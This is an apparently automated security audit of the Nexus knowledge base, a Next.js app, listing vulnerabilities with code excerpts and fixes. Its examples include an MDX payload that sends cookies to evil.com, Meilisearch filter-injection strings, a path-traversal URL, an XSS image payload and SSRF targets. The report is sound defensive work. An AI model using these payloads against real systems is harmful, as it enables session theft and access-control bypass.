# Security Audit Report — Nexus Knowledge Base

**Audit Date:** 2026-03-21
**Auditor:** Security Engineering (automated analysis)
**Scope:** All files in `src/`, `worker/`, `scripts/`, `prisma/`, and project configuration
**Application:** Next.js 15 + NextAuth v5 + Prisma + Meilisearch + BullMQ

---

## Executive Summary

The Nexus Knowledge Base application demonstrates reasonable security fundamentals: it uses Prisma (which provides parameterized queries), validates most API inputs with Zod, uses `bcryptjs` with 12 rounds, and employs NextAuth v5 with JWT sessions. However, several **critical** and **high-risk** vulnerabilities were identified that must be addressed before production deployment.

The most severe findings are:

1. **GitLab webhook token comparison is not timing-safe** (token forgery risk)
2. **MDX rendering executes arbitrary JSX from content files** (XSS / RCE if content is compromised)
3. **No rate limiting on any endpoint** (brute-force and abuse risk)
4. **Admin API routes are unprotected by middleware** (defense-in-depth gap)
5. **Path traversal possible in content loader** (file system access outside content directory)
6. **SSRF via webhook delivery** (arbitrary internal network requests)
7. **Meilisearch filter injection** via unsanitized search parameters

A total of **7 critical**, **6 high**, **5 medium**, and **4 low** issues were identified.

---

## Critical Vulnerabilities (Immediate Action Required)

### CRIT-01: GitLab Webhook Token Comparison Is Not Timing-Safe

**File:** `src/app/api/webhooks/gitlab/route.ts`, line 13
**Risk:** Token forgery via timing side-channel attack

The GitLab webhook endpoint uses a direct string comparison (`===`) to verify the webhook token:

```typescript
const token = request.headers.get("x-gitlab-token");
if (token !== secret) {
```

This is vulnerable to timing attacks. An attacker can iteratively guess the token by measuring response times. The custom webhook endpoint (`src/app/api/webhooks/custom/route.ts`) correctly uses `crypto.timingSafeEqual`, but the GitLab endpoint does not.

**Recommendation:** Use `crypto.timingSafeEqual` with fixed-length buffers, identical to the pattern in the custom webhook route.

---

### CRIT-02: MDX Rendering Executes Arbitrary JSX (XSS / Remote Code Execution)

**File:** `src/components/markdown/mdx-renderer.tsx`
**File:** `src/app/(public)/docs/[...slug]/page.tsx`, line 179

`next-mdx-remote` compiles and executes MDX content as React components at render time. MDX is a superset of Markdown that supports arbitrary JSX and JavaScript expressions. If a malicious contributor gains commit access to the content repository (or the content directory is writable), they can inject arbitrary JavaScript that executes in the server-side rendering context or in all users' browsers:

```mdx
export const x = fetch('https://evil.com/steal?cookie=' + document.cookie)

<script>alert('XSS')</script>
```

The `components` allowlist (`Admonition`, `VideoEmbed`, `pre: CodeBlock`) does not prevent arbitrary HTML/JSX since MDX passes through unknown elements as-is.

**Recommendation:**
- Use `next-mdx-remote`'s `compileMDX` with `development: false` and consider using `rehype-sanitize` to strip dangerous HTML.
- Restrict allowed JSX components via a custom recma plugin or switch to a safer renderer (e.g., `remark` + `rehype-sanitize` pipeline without MDX).
- Add a Content Security Policy (CSP) header to mitigate client-side XSS impact.

---

### CRIT-03: No Rate Limiting on Authentication Endpoints

**Files:** `src/app/api/auth/[...nextauth]/route.ts`, `src/lib/auth/config.ts`
**Risk:** Credential brute-force attacks

There is no rate limiting on the NextAuth credentials sign-in endpoint. An attacker can make unlimited login attempts to brute-force passwords. The seed script (`scripts/seed.ts`) uses the password `password123`, which would be trivially guessable even without brute-forcing.

**Recommendation:**
- Implement rate limiting on `/api/auth/*` using a middleware-level rate limiter (e.g., `@upstash/ratelimit` with Redis, or a custom sliding-window implementation with the existing Redis instance).
- Add progressive delays or account lockout after N failed attempts.
- Remove or change the weak seed password before any deployment.

---

### CRIT-04: Path Traversal in Content Loader

**File:** `src/lib/content/loader.ts`, lines 21-42

The `findDocFile` function constructs file paths by joining user-supplied slug parts directly:

```typescript
const slugPath = slugParts.join("/");
const candidates = [
  path.join(contentDir, `${slugPath}.md`),
  ...
];
```

The slug parts arrive from the URL parameter `[...slug]` in `src/app/(public)/docs/[...slug]/page.tsx`. While Next.js decodes URL segments, it does not prevent `..` segments. A request to `/docs/../../etc/passwd` would resolve to a path outside the content directory. Although the file would need to end in `.md` or `.mdx`, this is still a directory traversal vulnerability that could expose `.md` files outside the intended content tree.

**Recommendation:**
- After joining the slug path, call `path.resolve()` and verify the result starts with the content directory using `resolvedPath.startsWith(contentDir)`.
- Reject any slug segment containing `..` or absolute path characters.

---

### CRIT-05: SSRF via Webhook Delivery

**File:** `worker/jobs/webhook-deliver.ts`, line 35

The webhook delivery worker fetches an arbitrary URL stored in `registration.url` without any validation:

```typescript
const res = await fetch(registration.url, { ... });
```

An admin (or anyone who gains the ability to register webhooks) can configure a webhook URL pointing to internal services (e.g., `http://169.254.169.254/` for cloud metadata, `http://localhost:7700` for Meilisearch, or `http://redis:6379` for Redis). The 10-second timeout helps but does not prevent SSRF.

**Recommendation:**
- Validate webhook URLs against an allowlist of schemes (`https://` only in production).
- Block private/internal IP ranges (RFC 1918, link-local, loopback) by resolving the hostname and checking the IP before connecting.
- Consider using a dedicated egress proxy for webhook delivery.

---

### CRIT-06: Meilisearch Filter Injection via Search Parameters

**File:** `src/app/api/search/route.ts`, line 39
**File:** `src/app/(public)/search/page.tsx`, line 55

The `product` query parameter is interpolated directly into a Meilisearch filter string without escaping:

```typescript
if (product) filters.push(`product = "${product}"`);
```

An attacker can inject arbitrary Meilisearch filter syntax by supplying a crafted `product` parameter (e.g., `product=foo" OR access_tier = "admin`), potentially bypassing ACL filters and accessing documents they should not see.

**Recommendation:**
- Validate the `product` parameter against a known allowlist of product names.
- At minimum, escape or reject any `product` value containing double quotes, parentheses, or Meilisearch filter operators.

---

### CRIT-07: ACL Filter Injection via Extension Names

**File:** `src/lib/acl/index.ts`, lines 58-64

User extension names are interpolated directly into Meilisearch filter strings:

```typescript
const extFilter = user.extensions.length > 0
  ? user.extensions.map((e) => `"${e}"`).join(", ")
  : "";
```

If a malicious extension name containing a double quote is stored in the database (e.g., via a compromised admin granting a permission with a crafted extension name like `foo" OR access_tier = "admin`), it would break out of the filter string and bypass ACL restrictions.

**Recommendation:**
- Validate extension names against a strict alphanumeric + `/` + `-` pattern when granting permissions (the Zod schema in `src/app/api/admin/users/[id]/permissions/route.ts` only checks `z.string().min(1)` which is insufficient).
- Escape double quotes in extension names before interpolating into Meilisearch filters.

---

## High-Risk Issues

### HIGH-01: Middleware Does Not Protect Admin API Routes

**File:** `src/middleware.ts`

The middleware matcher only covers page routes:

```typescript
export const config = {
  matcher: ["/dashboard/:path*", "/admin/:path*"],
};
```

All admin API routes under `/api/admin/*` are **not matched by the middleware**. These routes implement their own auth checks (`session.user.tier !== "admin"`), but this is a defense-in-depth gap. If a developer adds a new admin API route and forgets the auth check, it will be completely unprotected.

**Recommendation:**
- Extend the middleware matcher to include `/api/admin/:path*`.
- Consider a centralized `requireAdmin()` helper that throws on unauthorized access, making it impossible to forget.

---

### HIGH-02: No CSRF Protection on State-Changing API Routes

**Files:** All POST/PATCH/DELETE routes under `src/app/api/`

NextAuth v5 manages CSRF tokens for its own sign-in/sign-out flows, but the application's custom API routes (`/api/access/request`, `/api/issues`, `/api/access/[id]/approve`, etc.) do not verify any CSRF token.

Since the application uses cookie-based JWT sessions, a malicious website can craft form submissions or fetch requests that will automatically include the session cookie:

- Approve/deny access requests on behalf of an admin
- Report issues
- Submit access requests

**Recommendation:**
- Implement CSRF protection using the double-submit cookie pattern or check the `Origin`/`Referer` header against the application's known origin.
- For API routes, require a custom header (e.g., `X-Requested-With`) that cannot be sent by simple cross-origin requests.

---

### HIGH-03: Webhook Secrets Stored in Plaintext in Database

**File:** `prisma/schema.prisma`, line 166

Webhook registration secrets are stored as plaintext `String` values in the `webhook_registrations` table. If the database is compromised, all webhook secrets are immediately exposed, allowing an attacker to forge webhook signatures.

**Recommendation:**
- Store webhook secrets hashed or encrypted at rest.
- Alternatively, derive HMAC signing keys from a combination of the stored secret and a server-side key (so database compromise alone is insufficient).

---

### HIGH-04: Email Template HTML Injection

**File:** `worker/jobs/email-notify.ts`, lines 58-78

User-supplied data (`data.userName`, `data.userEmail`, `data.message`, `data.pagePath`, `data.reviewNote`) is interpolated directly into HTML email templates without escaping:

```typescript
return `<p><strong>${data.userName}</strong> (${data.userEmail}) has requested...`;
```

An attacker can inject arbitrary HTML/JavaScript into emails by supplying crafted values (e.g., a user name like `<img src=x onerror=alert(1)>`). While email clients vary in their rendering, this can enable phishing attacks.

**Recommendation:**
- HTML-escape all user-supplied values before interpolation.
- Use a proper email templating library (the project already depends on `@react-email/components` but does not use it).

---

### HIGH-05: Seed Script Uses Weak Default Password

**File:** `scripts/seed.ts`, line 9

The seed script creates admin, client, and partner accounts all using the password `password123`:

```typescript
const passwordHash = await bcrypt.hash("password123", 12);
```

If the seed script runs in any environment beyond local development, these accounts become trivial entry points.

**Recommendation:**
- Generate random passwords in the seed script and print them to stdout.
- Add a check that prevents seeding in production (`NODE_ENV === "production"`).
- Document that seed credentials must be changed immediately.

---

### HIGH-06: Content-Sync Script Embeds Token in Git Clone URL

**File:** `scripts/content-sync.sh`, line 23

The GitLab token is embedded in the clone URL:

```bash
REPO_URL=$(echo "$GITLAB_URL" | sed 's|https://|https://oauth2:'"$GITLAB_TOKEN"'@|')
```

This token will appear in process listings (`ps aux`), shell history, and potentially in error messages or log output.

**Recommendation:**
- Use Git credential helpers or `GIT_ASKPASS` to provide the token without embedding it in the URL.
- If embedding is unavoidable, ensure the URL is never logged and set `GIT_TERMINAL_PROMPT=0`.

---

## Medium-Risk Issues

### MED-01: No JWT Expiration or Rotation Configured

**File:** `src/lib/auth/config.ts`

The NextAuth configuration does not set `session.maxAge` or configure token rotation. By default, NextAuth v5 uses a 30-day session, but there is no explicit configuration and no `jwt.maxAge` set. Additionally, the JWT callback does not refresh the user's `tier` from the database on subsequent requests -- a user whose tier is downgraded by an admin will retain elevated access until their token expires.

**Recommendation:**
- Set explicit `session.maxAge` (e.g., 8 hours for admin sessions).
- Re-fetch the user's current tier from the database in the `jwt` callback periodically, not just on initial sign-in.

---

### MED-02: Admin Can Escalate Any User to Admin Tier via Access Request Approval

**File:** `src/app/api/access/[id]/approve/route.ts`, lines 45-53
**File:** `src/app/api/access/request/route.ts`, line 9

The access request schema allows requesting `admin` tier:

```typescript
tierRequested: z.enum(["client", "partner", "admin"]),
```

When an admin approves such a request, the user is automatically upgraded to admin tier. While this requires admin approval, a regular user can request admin access and there is no special safeguard or confirmation for admin-tier upgrades.

**Recommendation:**
- Remove `"admin"` from the allowed `tierRequested` values, or require a separate, more privileged workflow for admin tier grants.

---

### MED-03: VideoEmbed Component Allows Arbitrary iframe Sources

**File:** `src/components/video/video-embed.tsx`

The `VideoEmbed` component accepts any `src` URL and renders it in an iframe:

```typescript
<iframe src={embedUrl} ... />
```

Since the component is available in MDX content, a content author can embed iframes pointing to arbitrary URLs, including phishing pages or pages that exploit browser vulnerabilities. The `sandbox` attribute is not set on the iframe.

**Recommendation:**
- Add a `sandbox` attribute to the iframe.
- Validate `src` against an allowlist of domains (YouTube, Vimeo, etc.).

---

### MED-04: Unvalidated `status` and `tier` Query Parameters in Admin Routes

**Files:** `src/app/api/admin/access-requests/route.ts`, `src/app/api/admin/users/route.ts`

Query parameters like `status` and `tier` are passed directly to Prisma `where` clauses without validation:

```typescript
if (status) where.status = status;
if (tier) where.tier = tier;
```

While Prisma uses parameterized queries (preventing SQL injection), invalid enum values will cause Prisma runtime errors that may leak schema information in error responses.

**Recommendation:**
- Validate query parameters against the expected enum values before passing to Prisma.

---

### MED-05: Audit Log IP Address Is Easily Spoofable

**Files:** `src/app/api/access/request/route.ts`, `src/app/api/access/[id]/approve/route.ts`, `src/app/api/access/[id]/deny/route.ts`

IP addresses are sourced from the `x-forwarded-for` header:

```typescript
request.headers.get("x-forwarded-for") || undefined
```

Without a trusted proxy configuration, this header can be trivially spoofed by clients. Additionally, most routes that call `logAudit` do not pass an IP address at all.

**Recommendation:**
- Configure a trusted proxy chain and only accept `x-forwarded-for` from known proxies.
- Consistently log IP addresses across all audit events.

---

## Low-Risk Issues

### LOW-01: `.env.example` Contains Default Credentials

**File:** `.env.example`

The example environment file contains default database credentials (`nexus/nexus`) and placeholder secrets:

```
POSTGRES_PASSWORD=nexus
MEILISEARCH_KEY=change-this-in-production
AUTH_SECRET=generate-with-openssl-rand-base64-32
```

While this is an example file, developers may copy it as-is for non-local deployments.

**Recommendation:**
- Use clearly invalid placeholder values (e.g., `CHANGE_ME_BEFORE_DEPLOY`).
- Add a startup check that rejects known placeholder values.

---

### LOW-02: Meilisearch Master Key Used as Client API Key

**File:** `src/lib/meilisearch/client.ts`

The same `MEILISEARCH_KEY` is used for both indexing and searching. If this is the Meilisearch master key, it grants full administrative access to the search engine.

**Recommendation:**
- Generate separate search-only and admin API keys in Meilisearch.
- Use the search-only key for the client-side search API and the admin key only for indexing operations.

---

### LOW-03: Error Responses May Leak Internal Details

**Files:** Various API routes

Some error handlers expose Prisma validation error details:

```typescript
{ error: "Invalid data", details: parsed.error.flatten() }
```

While Zod error details are generally safe, Prisma errors in uncaught cases could leak table names, column names, or constraint details.

**Recommendation:**
- Add a global error handler that sanitizes error responses in production.
- Only return detailed errors in development mode.

---

### LOW-04: `console.log` and `console.error` Used for Logging

**Files:** Multiple files across `worker/` and `src/`

Production secrets could accidentally appear in console logs. For example:

- `worker/jobs/email-notify.ts` line 32: logs email recipient and template data
- `worker/jobs/webhook-deliver.ts` line 84: logs webhook delivery URLs
- `src/lib/meilisearch/indexer.ts` line 65: logs document count

**Recommendation:**
- Use a structured logging library (e.g., `pino`) with log levels.
- Ensure sensitive data (tokens, secrets, email addresses) is redacted from log output.

---

## Dependency Security

### Package Analysis

| Package | Version | Notes |
|---------|---------|-------|
| `next` | ^15.3.0 | Current major. Check for specific CVEs. |
| `next-auth` | ^5.0.0-beta.25 | **Beta version**. Not production-stable. May contain unfixed security issues. |
| `bcryptjs` | ^3.0.3 | Acceptable. Uses 12 rounds (configured in seed; auth config inherits). |
| `next-mdx-remote` | ^5.0.0 | Executes arbitrary JSX -- see CRIT-02. |
| `gray-matter` | ^4.0.3 | Historically had a prototype pollution CVE (CVE-2021-28491 in v4.0.2). Ensure v4.0.3+ is installed. |
| `ioredis` | ^5.6.0 | Current. No known critical CVEs. |

**Key concern:** `next-auth@^5.0.0-beta.25` is a **beta** release. Beta versions may have undiscovered security vulnerabilities and do not receive the same security review cadence as stable releases. This is a risk for a production deployment handling authentication.

**Recommendation:**
- Pin dependencies to exact versions or narrow ranges in `package-lock.json` (which is present).
- Monitor `next-auth` v5 for stable release and upgrade promptly.
- Run `npm audit` regularly and integrate it into CI.

---

## Pre-Production Security Checklist

### Authentication & Sessions
- [ ] Add rate limiting to `/api/auth/signin` (CRIT-03)
- [ ] Set explicit `session.maxAge` in NextAuth config (MED-01)
- [ ] Implement JWT tier refresh from database on each request (MED-01)
- [ ] Change seed passwords or disable seeding in production (HIGH-05)
- [ ] Remove `"admin"` from requestable access tiers (MED-02)

### Input Validation & Injection
- [ ] Add path traversal protection to content loader (CRIT-04)
- [ ] Sanitize `product` search parameter against filter injection (CRIT-06)
- [ ] Validate and escape extension names in ACL filter builder (CRIT-07)
- [ ] Validate `status`/`tier` query params against enum values (MED-04)
- [ ] Add `rehype-sanitize` to MDX pipeline or restrict allowed elements (CRIT-02)
- [ ] Restrict `VideoEmbed` src to allowlisted domains and add `sandbox` attribute (MED-03)
- [ ] HTML-escape all values in email templates (HIGH-04)

### Network & SSRF
- [ ] Validate webhook delivery URLs against private IP ranges (CRIT-05)
- [ ] Block internal network access from webhook worker

### Secrets & Configuration
- [ ] Use timing-safe comparison for GitLab webhook token (CRIT-01)
- [ ] Store webhook registration secrets encrypted (HIGH-03)
- [ ] Use separate Meilisearch API keys for search vs. indexing (LOW-02)
- [ ] Replace placeholder values in `.env.example` (LOW-01)
- [ ] Add startup validation that rejects placeholder secrets
- [ ] Avoid embedding GitLab token in clone URLs (HIGH-06)

### CSRF & Headers
- [ ] Add CSRF protection to all state-changing API routes (HIGH-02)
- [ ] Add `Content-Security-Policy` header
- [ ] Add `X-Content-Type-Options: nosniff` header
- [ ] Add `X-Frame-Options: DENY` header
- [ ] Add `Referrer-Policy: strict-origin-when-cross-origin` header

### Middleware & Authorization
- [ ] Extend middleware matcher to cover `/api/admin/:path*` (HIGH-01)
- [ ] Add centralized `requireAdmin()` helper for API routes

### Rate Limiting
- [ ] Rate limit `/api/auth/*` endpoints (CRIT-03)
- [ ] Rate limit `/api/search` endpoint
- [ ] Rate limit `/api/issues` endpoint
- [ ] Rate limit `/api/access/request` endpoint
- [ ] Rate limit webhook ingestion endpoints

### Monitoring & Logging
- [ ] Replace `console.log/error` with structured logging (LOW-04)
- [ ] Redact sensitive data from logs
- [ ] Set up alerting for failed authentication attempts
- [ ] Set up alerting for webhook signature validation failures

### Infrastructure
- [ ] Run `npm audit` and resolve all findings
- [ ] Upgrade `next-auth` to stable v5 when available
- [ ] Verify `gray-matter` version is >= 4.0.3
- [ ] Configure trusted proxy for accurate IP logging (MED-05)
- [ ] Set `NODE_ENV=production` in production
- [ ] Enable HTTPS-only cookies for session tokens

---

## Summary of Findings

| Severity | Count | Key Areas |
|----------|-------|-----------|
| Critical | 7 | Timing-safe comparison, MDX XSS, rate limiting, path traversal, SSRF, filter injection (x2) |
| High | 6 | Middleware gap, CSRF, webhook secrets, email injection, seed passwords, token in URLs |
| Medium | 5 | JWT expiration, admin escalation, iframe sources, unvalidated enums, IP spoofing |
| Low | 4 | Default credentials, Meilisearch key reuse, error leakage, console logging |

**Overall Risk Assessment: HIGH** -- The application should not be deployed to production without addressing all Critical and High findings.
